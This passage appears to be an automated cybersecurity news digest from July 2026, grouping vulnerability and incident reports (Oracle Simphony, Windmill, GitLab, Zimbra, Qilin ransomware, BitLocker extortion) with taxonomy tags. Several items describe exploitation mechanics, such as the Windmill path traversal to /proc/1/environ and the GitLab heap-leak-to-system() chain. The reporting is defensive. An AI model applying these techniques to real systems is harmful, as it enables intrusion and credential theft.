Windows may automatically transmit NTLM authentication material during this connection. Captured NTLM hashes may be cracked offline or relayed to other systems, potentially facilitating credential compromise and lateral movement. Characteristics Attack vector: Network Attack complexity: Low Privileges required: None User interaction: None Primary impact: NTLM hash disclosure CVE-2026-60168 & CVE-2026-60169: Arbitrary File Write CVE-2026-60168 and CVE-2026-60169 affect the EGateway Printing Handler. The vulnerabilities result from insufficient validation of attacker-controlled input before file operations are performed. Oracle assigned two CVEs to distinct weaknesses within the processing chain that together create a single arbitrary file write condition. An unauthenticated attacker can submit crafted requests that cause arbitrary files to be written to the underlying host. Successful exploitation may allow an attacker to: Write attacker-controlled files Establish persistence Prepare the system for subsequent code execution Facilitate additional compromise Characteristics Attack vector: Network Attack complexity: Low Privileges required: None User interaction: None Primary impact: Arbitrary file write CVE-2026-60170: Authentication Bypass CVE-2026-60170 affects the Simphony Kiosk application. Improper validation of user-controlled input allows an unauthenticated attacker to bypass authentication and gain access to the Kiosk administrator console. Horizon3.ai research demonstrated that this unauthorized administrative access can be leveraged to execute arbitrary code on the underlying host. Successful exploitation may enable an attacker to: Execute arbitrary code Establish persistence Access locally available data Use the compromised system as a foothold for additional attacks Characteristics Attack vector: Network Attack complexity: Low Privileges required: None User interaction: None Primary impact: Authentication bypass leading to arbitrary code execution NodeZero® Proactive Security Platform — Rapid Response A single NodeZero Rap
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169 & CVE-2026-60170 | Oracle Hospitality Simphony Multiple Vulnerabilities
  - Published: 2026-07-22T19:32:52+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/oracle-hospitality-simphony-vulnerabilities/
  - Summary: Learn about four remotely exploitable Oracle Hospitality Simphony vulnerabilities and how NodeZero Rapid Response helps validate exposure and verify remediation.

### Cluster c4020d76d0 — score 17

- Title: Hackers Exploit Windmill Flaw to Read Arbitrary Server Files Without Authentication
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-22T12:36:36+00:00
- Link: https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-29059

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: AWS, WordPress
- cve_ids: CVE-2021-27137, CVE-2026-0770, CVE-2026-29059, CVE-2026-60137, CVE-2026-63030
- urgency_signals: actively_exploited, poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: WordPress, AWS
- cve_ids: CVE-2026-29059, CVE-2026-60137, CVE-2026-63030, CVE-2021-27137, CVE-2026-0770
- urgency_signals: actively_exploited, preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A high-severity security flaw impacting open-source developer platform Windmill has come under active exploitation in the wild, per VulnCheck. The vulnerability in question is CVE-2026-29059 (CVSS score: 7.5), a case of unauthenticated path traversal impacting Windmill's "get_log_file" endpoint ("/api/w/{workspace}/jobs_u/get_log_file/{filename}"). "The filename parameter is concatenated into
```

#### Full body

```
Hackers Exploit Windmill Flaw to Read Arbitrary Server Files Without Authentication  Ravie Lakshmanan  Jul 22, 2026 Vulnerability / Web Security A high-severity security flaw impacting open-source developer platform Windmill has come under active exploitation in the wild, per VulnCheck. The vulnerability in question is CVE-2026-29059 (CVSS score: 7.5), a case of unauthenticated path traversal impacting Windmill's "get_log_file" endpoint ("/api/w/{workspace}/jobs_u/get_log_file/{filename}"). "The filename parameter is concatenated into a file path without sanitization, allowing an attacker to read arbitrary files on the server using ../ sequences," according to an advisory published by Windmill in March 2026. "The primary sensitive value exposed by this vulnerability is the SUPERADMIN_SECRET environment variable, readable via /proc/1/environ. When set, this secret can be used as a Bearer token to authenticate as a superadmin and execute arbitrary code through the job preview API." However, it's worth noting that SUPERADMIN_SECRET is not set by default, and for standalone Windmill instances without SUPERADMIN_SECRET configured, the impact of the vulnerability is limited to arbitrary file read. The issue has since been addressed in Windmill 1.603.3, released in January 2026, by adding sanitization checks to the filename parameter to prevent directory traversal. According to VulnCheck, whose security researcher Valentin Lobstein is credited with discovering and reporting the flaw, exploitation efforts have been directed against Windmill's "get_log_file" endpoint to extract sensitive information from the "/etc/passwd" file. "We've observed exploits aimed at both direct Windmill endpoints and the Nextcloud proxy path," Caitlin Condon, vice president of security research at VulnCheck, said in a post on LinkedIn. The cybersecurity company said it identified about 170 vulnerable systems exposed across 24 countries. The disclosure comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added four security flaws to its Known Exploited Vulnerabilities ( KEV ) catalog, including two WordPress bugs tracked as wp2shell ( CVE-2026-60137 and CVE-2026-63030 ), along with a stack-based buffer overflow in DD-WRT ( CVE-2021-27137 ) and an unauthenticated remote code execution issue in Langflow ( CVE-2026-0770 ). "wp2shell is one of the most significant WordPress Core security events in recent years," Wordfence said . "The combination of unauthenticated reachability, no plugin or theme requirement, a large global attack surface, a path to administrator access and code execution, as well as public proof-of-concept exploit availability makes this vulnerability chain unusually serious." Attack data captured by the WordPress security company shows that threat actors are issuing requests to exploit the REST API batch request route-confusion issue and an unauthenticated SQL injection to achieve code execution. VulnCheck also said it had verified more than two-dozen unique PoC exploits targeting WP2Shell as of July 19, 2026. "Affected users should update to a fixed version of WordPress as soon as possible, given the overwhelming likelihood that various public exploits and large-scale exploitation will follow the high-profile disclosure," it added . As for CVE-2026-0770, KEVIntel's Ryan Dewhurst told The Hacker News that first in-the-wild attack efforts targeting the flaw were detected against its sensors on June 27, 2026, recording 137 exploitation attempts from 46 unique attacker IP addresses associated with 17 countries since then. No less than 75 attempts, which account for more than half of the activity, originated from 20 attacker IP addresses during the last seven days. Observed payloads include base command execution checks, attempts to extract the contents of "/etc/passwd" or access AWS credentials, environment variable collection, malware downloads using wget or curl, and shell script execution to install second-stage payloads
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Hackers Exploit Windmill Flaw to Read Arbitrary Server Files Without Authentication
  - Published: 2026-07-22T12:36:36+00:00
  - Link: https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html
  - Summary: A high-severity security flaw impacting open-source developer platform Windmill has come under active exploitation in the wild, per VulnCheck. The vulnerability in question is CVE-2026-29059 (CVSS score: 7.5), a case of unauthenticated path traversal impacting Windmill's "get_log_file" endpoint ("/api/w/{workspace}/jobs_u/get_log_file/{filename}"). "The filename parameter is concatenated into

### Cluster 1a5eab7c27 — score 15

- Title: Researcher Publishes GitLab RCE PoC Letting Authenticated Users Run Commands as Git
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-25T08:34:15+00:00
- Link: https://thehackernews.com/2026/07/researcher-publishes-gitlab-rce-poc.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: GitLab

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: GitLab
- urgency_signals: no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: GitLab
- urgency_signals: no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Security researcher Yuhang Wu at depthfirst has published a working proof-of-concept (PoC) exploit that executes commands as git on an unpatched self-managed GitLab 18.11.3 server. An ordinary authenticated user triggers it by committing two crafted Jupyter notebooks and requesting their diff. The chain needs no administrator rights, continuous integration (CI) runner access, victim interaction
```

#### Full body

```
Researcher Publishes GitLab RCE PoC Letting Authenticated Users Run Commands as Git  Swati Khandelwal  Jul 25, 2026 Vulnerability / Application Security Security researchers depthfirst published working exploit code on July 24 for a GitLab flaw that GitLab patched six weeks earlier, on June 10. It runs commands as git on any self-managed 18.11.3 server that has not taken the update. Any authenticated user who can push to a project can run it. The attacker commits a crafted Jupyter notebook and opens its commit diff, which leaks a heap pointer. Enough of those and an automated probe can locate the libraries in memory. Two more notebooks then fire the payload. No administrator rights, no CI or runner access, no victim interaction, no access to anyone else's project. GitLab did not file the fix as a security fix. A review by The Hacker News found the Oj 3.17.3 bump listed under bug fixes in the June 10 patch release , not in the security-fix table. There is no CVE, no CVSS score, and no mention of the notebook-diff chain. Operators who triaged that release against the security table had no reason to treat it as urgent. Two memory corruption bugs in Oj, a Ruby JSON parser implemented largely in native C, make the chain work. depthfirst says its system flagged them autonomously, and researchers chained them by hand. GitLab's notebook renderer, an in-tree gem called ipynbdiff , passes repository-controlled .ipynb JSON to Oj::Parser.usual.parse inside a long-lived Puma worker, so attacker-controlled bytes reach Oj's manually managed C memory inside the application process. One bug writes past a fixed 1,024-byte nesting stack until it controls the parser's start callback. The other truncates a 65,565-byte object key to 29 in a signed 16-bit field and returns a live heap pointer, which GitLab renders into the diff. The leak locates libc, and the write points the callback at system() . Component Affected First fixed GitLab CE/EE 15.2.0 to 18.10.7 18.10.8 GitLab CE/EE 18.11.0 to 18.11.4 18.11.5 GitLab CE/EE 19.0.0 to 19.0.1 19.0.2 Oj gem 3.13.0 to 3.17.1 3.17.3 All tiers are affected, CE and EE, Free through Ultimate. Ruby itself is not. Oj 3.17.2 carried other fixes from the same review but not these two. Upgrade to 18.10.8 , 18.11.5 , or 19.0.2 . Neither GitLab nor depthfirst offers a workaround for anyone who cannot. The trap is Helm and Operator: check the GitLab version inside the Webservice image running Puma, not the chart or Operator version. Anything on 15.2 through 18.9 gets no backport, because those lines sit outside GitLab's security-maintained patch trains , so those installs have to move to a supported release instead. Commands run as git , the account behind Puma. How far that goes depends on how the install is isolated. In reach: source code, Rails secrets, service credentials, CI/CD data, and internal services the application can talk to. The public exploit is built for GitLab 18.11.3 on x86-64. Gadget offsets, register state, and jemalloc behavior all came from that image, and a recovered library base holds only until the Puma master restarts, so this is not drop-in against an arbitrary target. The Oj bugs are general; porting the exploit is real work. depthfirst measured five to ten minutes for the memory search on a fresh two-worker install and projects one to two hours on longer-running ones. Its writeup has the full chain. depthfirst reported the Oj bugs on May 21, the maintainer merged fixes on May 27, and Oj 3.17.3 shipped June 4. The GitLab chain went to GitLab on June 5, was confirmed on June 8, and was patched on June 10. depthfirst says it is not aware of in-the-wild exploitation, and that GitLab reproduced the RCE independently. Its wider Oj review produced nine more CVE advisories, none of them this chain. The Hacker News has asked GitLab why the fix was not classified as a security issue and whether a CVE will be assigned, and asked depthfirst about exploit portability. Responses are pending. Found this
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Researcher Publishes GitLab RCE PoC Letting Authenticated Users Run Commands as Git
  - Published: 2026-07-25T08:34:15+00:00
  - Link: https://thehackernews.com/2026/07/researcher-publishes-gitlab-rce-poc.html
  - Summary: Security researcher Yuhang Wu at depthfirst has published a working proof-of-concept (PoC) exploit that executes commands as git on an unpatched self-managed GitLab 18.11.3 server. An ordinary authenticated user triggers it by committing two crafted Jupyter notebooks and requesting their diff. The chain needs no administrator rights, continuous integration (CI) runner access, victim interaction

### Cluster 14625d1950 — score 15

- Title: Now in preview: Find and fix software vulnerabilities with CodeMender
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-07-21T15:00:00+00:00
- Link: https://cloud.google.com/blog/products/identity-security/find-and-fix-software-vulnerabilities-with-codemender/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Google/Gemini

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain, zero_day
- affected_industries: government
- affected_products: Google/Gemini, Salesforce
- urgency_signals: zero_day
- content_type: news_report, vendor_announcement
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day
- affected_industries: government
- affected_products: Salesforce, Google/Gemini
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
As adversarial AI threats accelerate attacks on code, security teams must counter them with machine-speed defenses that can automate code remediation and fight AI with AI. CodeMender is our managed code security agent, and starting today, we're bringing its code scanning and remediation capabilities directly to you in preview. CodeMender offers access to our generally available models via Gemini Enterprise Agent Platform , or it can be deployed as a core component of AI Threat Defense . CodeMender also aligns with our multi-model approach , so you can choose the right model to optimize for cost, speed, and deep scanning performance. It will support third-party frontier model options later this year. How to find and fix code vulnerabilities autonomously with Google CodeMender. Watch this overview of CodeMender in Gemini Enterprise Agent Platform. CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day risk. It examines and remediates exis
```

#### Full body

```
Security & Identity Now in preview: Find and fix software vulnerabilities with CodeMender July 21, 2026 Michael Gerstenhaber VP, Product Management, Gemini Enterprise Clemens Viernickel Director, Product Management, Cloud AI Try Gemini Enterprise Business Edition today The front door to AI in the workplace Try now As adversarial AI threats accelerate attacks on code, security teams must counter them with machine-speed defenses that can automate code remediation and fight AI with AI. CodeMender is our managed code security agent, and starting today, we're bringing its code scanning and remediation capabilities directly to you in preview. CodeMender offers access to our generally available models via Gemini Enterprise Agent Platform , or it can be deployed as a core component of AI Threat Defense . CodeMender also aligns with our multi-model approach , so you can choose the right model to optimize for cost, speed, and deep scanning performance. It will support third-party frontier model options later this year. Watch this overview of CodeMender in Gemini Enterprise Agent Platform. CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day risk. It examines and remediates existing code security issues without sacrificing development velocity by: Deploying the best-fit model . You can choose from multiple models to optimize for costs, speed, deep scanning, and coding performance. Automating machine-scale remediation . You can now eliminate remediation bottlenecks caused by manual verification and patching, while keeping developers in the loop. Prioritizing fixes by exploitability . You can run proof-of-concept exploits and execute simulations to verify that vulnerabilities in the code are exploitable, and prioritize resources on fixing the most critical issues first. Find and fix vulnerabilities with AI Born from Google DeepMind's pioneering AI research , CodeMender transforms vulnerability management from a manual bottleneck into an autonomous, high-speed system. Your developers and security practitioners can automatically scan software for flaws, verify them with executable exploits, and remediate them with tested code fixes. “At Salesforce, trust is our number one value, and protecting customer data means continually raising the bar for how we find, validate, and mitigate risks. CodeMender brings AI into a critical part of the security lifecycle by accelerating the path from validated vulnerability to tested fix. As AI reshapes the threat landscape, capabilities like this help strengthen resilience and give our customers the confidence to keep innovating,” said Iain Mulholland, CISO, Salesforce . "CodeMender consistently identified critical vulnerabilities that our other AI-enabled tools completely missed. It doesn't just find theoretical flaws — it proves the immediate risk and delivers targeted, validated fixes that secure our environment without disrupting core business logic," said Scott Ponte, head, Security Operations, Robinhood. "CodeMender is fast, comprehensive, and genuinely ambitious about closing the loop from detection to fix, enabling teams to secure their software supply chain without losing velocity," said Ashwin Kannan, principal AI engineer, Office of the CTO, Palo Alto Networks. How the CodeMender agent works We’ve fine-tuned CodeMender’s harness to be continuously updated with the latest Google DeepMind research, including the up-to-date agent skills, security tools, and system prompts. Operating in the secure-by-design Agent Platform, CodeMender is protected by enterprise-grade, built-in governance and security guardrails, including secure traffic routing through your VPC, data isolation and encryption, and zero retention of source code data. As an agent, it can integrate with existing continuous integration and continuous delivery (CI/CD) workflows, or run directly in local developer environments using a lightweight command-line interface (CLI) client. You can
```

#### Corroborating sources (2)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Now in preview: Find and fix software vulnerabilities with CodeMender
  - Published: 2026-07-21T15:00:00+00:00
  - Link: https://cloud.google.com/blog/products/identity-security/find-and-fix-software-vulnerabilities-with-codemender/
  - Summary: As adversarial AI threats accelerate attacks on code, security teams must counter them with machine-speed defenses that can automate code remediation and fight AI with AI. CodeMender is our managed code security agent, and starting today, we're bringing its code scanning and remediation capabilities directly to you in preview. CodeMender offers access to our generally available models via Gemini Enterprise Agent Platform , or it can be deployed as a core component of AI Threat Defense . CodeMender also aligns with our multi-model approach , so you can choose the right model to optimize for cost, speed, and deep scanning performance. It will support third-party frontier model options later this year. How to find and fix code vulnerabilities autonomously with Google CodeMender. Watch this overview of CodeMender in Gemini Enterprise Agent Platform. CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day risk. It examines and remediates exis
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Google Launches Gemini 3.5 Flash Cyber AI to Find and Fix Software Vulnerabilities
  - Published: 2026-07-21T15:09:28+00:00
  - Link: https://thehackernews.com/2026/07/google-launches-gemini-35-flash-cyber.html
  - Summary: Google's DeepMind on Tuesday announced the release of Gemini 3.5 Flash Cyber, a specialized artificial intelligence (AI) model built atop 3.5 Flash that's designed to discover, validate, and patch vulnerabilities quickly and efficiently. According to the tech giant, the model will be exclusively available to governments and trusted partners via CodeMender as part of a limited-access pilot

### Cluster 31d26a81e9 — score 14

- Title: A new extortion cocktail: office printers, small ransoms, and BitLocker
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-07-21T13:00:29+00:00
- Link: https://securelist.com/new-extortion-scheme-printers-bitlocker/120718/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Microsoft BitLocker

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: financial_services
- affected_products: Microsoft BitLocker
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: financial_services
- affected_products: Microsoft BitLocker
- content_type: incident_report
- confidence_tier: tier_1_primary_research

#### Summary

```
We cover two recent cases of BitLocker extortion using RDP, MSSQL, RMM tools, web shells, and printers. The story includes TTPs and recommendations.
```

#### Full body

```
Table of Contents Initial sign of an attack First case: abusing RDP to encrypt data Second case: meet the XEntry Team Conclusions Detection signatures Authors Eduardo Ovalle Recently, our teams in Latin America investigated a series of incidents involving misconfiguration, the deployment of BitLocker, and the exploitation of corporate printers. Attackers used the devices to notify organizations that their infrastructure had been compromised and they had to pay a ransom to recover their data. This article analyzes two incidents that occurred in June in Colombia and in May in Mexico. We highlight the similarities in the attackers’ communications and outline emerging trends in ransom amounts. Initial sign of an attack In both cases, the affected users initially noticed a padlock icon next to their drives in Windows Explorer. This indicated that the drive was encrypted with BitLocker, blocking access to its contents. Drive icon indicating that the drive is locked A recovery key was required to unlock the drive. Attempt to access the disk’s contents and the prompt for the BitLocker recovery key This is not the first time we have seen such threats; a few years ago, our team discovered a threat known as ShrinkLocker , which utilized BitLocker to achieve its goals. First case: abusing RDP to encrypt data One of the incidents occurred in Colombia in June. The attackers exploited an internet-exposed RDP service on a machine connected to an 8 TB storage device containing mission-critical data. After taking control of the system and manipulating user credentials, the attackers enabled BitLocker exclusively on the drive that primarily stored financial data. Once the encryption was complete, they locked the drive and used the company’s printers to produce ransom notes. Ransomware note Unfortunately, it was not possible to obtain evidence in the case due to the company’s rush to restore the encrypted disk. The communication with the attackers revealed a demand for just $3,000, and the company considered paying the ransom. After that, the system was restored before the forensic team could take any action, eliminating the evidence needed to assess the incident. Attacker’s reply to the victim’s email sent to the address in the printed ransom note This attack was made possible by an internet-facing remote desktop service (RDP) with additional open ports, which employees used to access corporate information. By exploiting this network exposure and misconfiguration, attackers breached the system, identified an additional drive, and leveraged BitLocker to encrypt the data and demand a ransom payment. Leaving RDP ports open without proper security controls jeopardizes the security of systems and information, as highlighted in the our “ Global Report: Anatomy of a Cyber World “. Exposed ports identified in the system in recent months The company confirmed that, due to compatibility issues with applications required for operation, EPP (Endpoint Protection Platform) protection was disabled on the system, making it easier for attackers to validate, enumerate, and execute applications without revealing malicious activity to central monitoring systems. Second case: meet the XEntry Team In another incident, which occurred in Mexico in May, our team identified how the threat actor gained initial access to the infrastructure. They exploited a misconfigured MSSQL service. This allowed them to execute commands on the system after obtaining the database login credentials from code insecurely published on GitHub. XEntry team attack In this incident, the attack began three months prior to detection, with the intruder discovering and verifying their access to the environment. After confirming their access and privilege level within the MSSQL server settings, which extended beyond the DBMS to the underlying operating system, the attackers initially focused on manipulating certain aspects of the web server configuration on the same system. They lowered the server’s
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: A new extortion cocktail: office printers, small ransoms, and BitLocker
  - Published: 2026-07-21T13:00:29+00:00
  - Link: https://securelist.com/new-extortion-scheme-printers-bitlocker/120718/
  - Summary: We cover two recent cases of BitLocker extortion using RDP, MSSQL, RMM tools, web shells, and printers. The story includes TTPs and recommendations.

### Cluster 0e52963d05 — score 14

- Title: Why Exposure Management Is Replacing Vulnerability Management
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-07-21T17:47:25+00:00
- Link: https://horizon3.ai/intelligence/blogs/exposure-vs-vulnerability-management/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Traditional vulnerability management tells you what is broken. Exposure management reveals what attackers can actually exploit. Learn why security leaders are shifting from vulnerability counts to measurable exposure reduction.
```

#### Full body

```
Why Exposure Management Is Replacing Vulnerability Management Stephen Gates July 21, 2026 Blogs Visibility Isn’t the Problem Vulnerability management isn’t failing because security teams lack visibility. Most organizations already have more findings than they can reasonably address. Yet despite all those findings, many CISOs still struggle to answer a deceptively simple question: Are we actually becoming harder to attack? That question sits at the center of a growing problem. Security programs have become very good at finding issues, but finding issues and reducing risk are not the same thing. In many organizations, those two concepts have become interchangeable, which is exactly why traditional vulnerability management is beginning to break down. The underlying assumption behind vulnerability management is straightforward. If you can identify vulnerabilities, prioritize them, and patch them, risk should decrease. That logic worked reasonably well when environments were smaller, infrastructure changed at a slower pace, and vulnerabilities were treated as the primary indicator of risk. Today’s environments operate differently. Vulnerabilities are rarely encountered in isolation and are often only one component of a broader security problem. The challenge is no longer finding vulnerabilities. The challenge is understanding exposure. This shift is one reason the Gartner® Continuous Threat Exposure Management (CTEM) framework has gained traction. At its core, the framework recognizes that understanding risk requires looking beyond individual vulnerabilities and evaluating the broader exposures that attackers can actually exploit. Why Prioritization Keeps Falling Short The challenge becomes apparent when organizations try to prioritize risk. Traditional vulnerability management evaluates findings individually, often using severity scores as a proxy for risk. Attackers take a different approach. They evaluate how weaknesses connect, what access they provide, and how they can be combined to reach a meaningful objective. That distinction matters because severity and risk are not the same thing. A critical vulnerability that cannot be reached or exploited may represent very little practical risk. Meanwhile, a lower-severity issue combined with weak credentials, excessive permissions, or a misconfigured identity relationship can create a direct path to sensitive systems and data. Attackers understand this instinctively. They do not attack vulnerabilities one at a time. They chain weaknesses together, move laterally across environments, escalate privileges, and pursue the path that gets them closest to their objective. Severity Is Not Risk One of the biggest reasons vulnerability management struggles today is that severity has become a stand-in for risk. It is easy to understand why. Severity scores provide a standardized way to compare findings, helping teams sort large volumes of vulnerabilities and establish remediation priorities. A vulnerability only matters if it contributes to an attacker’s ability to achieve an objective, whether that objective is accessing sensitive data, escalating privileges, or moving laterally through an environment. In every case, the question is not, “How severe is this vulnerability?” but rather, “Can this weakness be used as part of a path to something valuable?” Those are fundamentally different questions. One measures the characteristics of a finding. The other evaluates the opportunity it creates for an attacker. As environments become more interconnected, the gap between those perspectives continues to grow. Exposure Is Bigger Than Vulnerabilities Visibility tells you what vulnerabilities exist. Exposure tells you how attackers can use them. That distinction is becoming increasingly important because exposure is broader than a vulnerability. It includes the relationships between weaknesses, identities, permissions, assets, trust relationships, and business systems that create opportunities for attack
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Why Exposure Management Is Replacing Vulnerability Management
  - Published: 2026-07-21T17:47:25+00:00
  - Link: https://horizon3.ai/intelligence/blogs/exposure-vs-vulnerability-management/
  - Summary: Traditional vulnerability management tells you what is broken. Exposure management reveals what attackers can actually exploit. Learn why security leaders are shifting from vulnerability counts to measurable exposure reduction.

### Cluster 51bbe21d6c — score 14

- Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
- Source: Proofpoint Threat Insight (detection_response_operations)
- Published: 2026-07-23T16:13:08+00:00
- Link: https://www.proofpoint.com/us/newsroom/news/russian-espionage-group-exploited-zimbra-zero-day-steal-mail-and-2fa-codes
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, zero_day
- actor_attribution: APT28
- affected_industries: financial_services, government, manufacturing_industrial
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, apt_espionage
- actor_attribution: APT28
- affected_industries: financial_services, government, manufacturing_industrial
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Full body

```
Image: Le Vu via Unsplash International alert spotlights Russia-linked attacks on Zimbra webmail Russian state-aligned hackers have been compromising governmental and commercial organizations throughout the West through zero-click phishing emails, federal agencies in the U.S., U.K., Europe, Australia and New Zealand warned on Thursday. The campaign, carried out by the advanced persistent threat (APT) group Laundry Bear, targets Zimbra Collaboration Suite’s webmail platform and exploits a vulnerability that was patched in November 2025. According to the advisory , the hackers carried out “extensive” targeting of Ukrainian entities before training their sights on U.S. and NATO organizations — evidence of “an increasing trend within Russian cyber threat groups to target Ukrainian users first—both as a priority target and as a testbench for malicious cyber techniques before broader global deployment.” “The covert and persistent nature of this activity, along with the absence of any known financial extortion, almost certainly indicates this group’s involvement in espionage activities with Russian government backing,” the agencies concluded. Palo Alto Networks’ Unit 42, which also published a report Thursday on the campaign, said the hackers targeted the defense and transportation sectors, as well as financial organizations in NATO member states, Ukraine, Commonwealth of Independent States countries and Africa. In its own advisory , Proofpoint said the group had compromised “government, high science, and defense industrial base targets in the United States.” Laundry Bear was first identified in May 2025 by Dutch intelligence agencies, which blamed the group for a series of hacks in the Netherlands, including on the national police. According to Microsoft, it has been active since at least 2024. Previous campaigns involved “unsophisticated” techniques, like password spraying and phishing attempts that required a recipient to click on a link. Since at least July 2025, the group has been deploying a novel exploit against the CVE-2025-66376 vulnerability in which a malicious JavaScript payload is hidden in emails sent from previously compromised email accounts. The payload is executed immediately when the emails are opened. According to the advisory, the hackers have attempted to exfiltrate the last 90 days of emails from a compromised account, passwords, contact lists, two-factor authentication tokens and other passcodes. In March 2026, the cybersecurity firm Seqrite described a zero-click phishing campaign exploiting Zimbra webmail that compromised a Ukrainian maritime agency . They attributed the activity with medium confidence to the Russian APT known as Fancy Bear. Dutch intelligence said Laundry Bear’s tactics “overlap with the modus operandi” of Fancy Bear but that they are different actors. Proofpoint researchers said the campaign reflects other activity in recent years from Russian and Belarusian hackers using cross-site scripting exploits “to pillage webmail servers.” The government agencies implored organizations using the Zimbra webmail service to immediately patch their software and, if patching is not feasible, to direct employees to use a different mail client. Nation-state News Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post. He is also a radio and podcast producer for outlets like Snap Judgment.
```

#### Corroborating sources (1)

- **Proofpoint Threat Insight** (detection_response_operations)
  - Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
  - Published: 2026-07-23T16:13:08+00:00
  - Link: https://www.proofpoint.com/us/newsroom/news/russian-espionage-group-exploited-zimbra-zero-day-steal-mail-and-2fa-codes

### Cluster 17b63d385b — score 14

- Title: Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-21T14:04:57+00:00
- Link: https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-0257, Palo Alto Networks

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion, zero_day
- actor_attribution: ShinyHunters
- affected_products: Microsoft Entra, Palo Alto Networks, Salesforce
- cve_ids: CVE-2026-0257
- urgency_signals: poc_available, preauth_unauth, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, zero_day
- actor_attribution: ShinyHunters
- affected_products: Salesforce, Palo Alto Networks, Microsoft Entra
- cve_ids: CVE-2026-0257
- urgency_signals: zero_day, preauth_unauth, poc_available
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway
```

#### Full body

```
Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access  Ravie Lakshmanan  Jul 21, 2026 Vulnerability / Network Security Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway components of PAN-OS software. Successful exploitation of the flaw allows unauthenticated remote attackers to sidestep authentication and establish VPN sessions without valid credentials when authentication override cookies are enabled with specific certificate configurations. "Post-exploitation tradecraft varied across intrusions, from rapid encryption-only operations to full double-extortion, possibly suggesting multiple affiliates operating under the Qilin ransomware-as-a-service (RaaS) umbrella," the cybersecurity company said . "Attackers demonstrated consistent operational patterns despite tradecraft variation: staging ransomware at C:\PerfLogs\, using PsExec for lateral execution via administrative shares, deploying password-protected ransomware payloads, and implementing comprehensive log-clearing routines." The threat actors have been found to weaponize the flaw to gain authenticated access to victim networks by establishing SSL 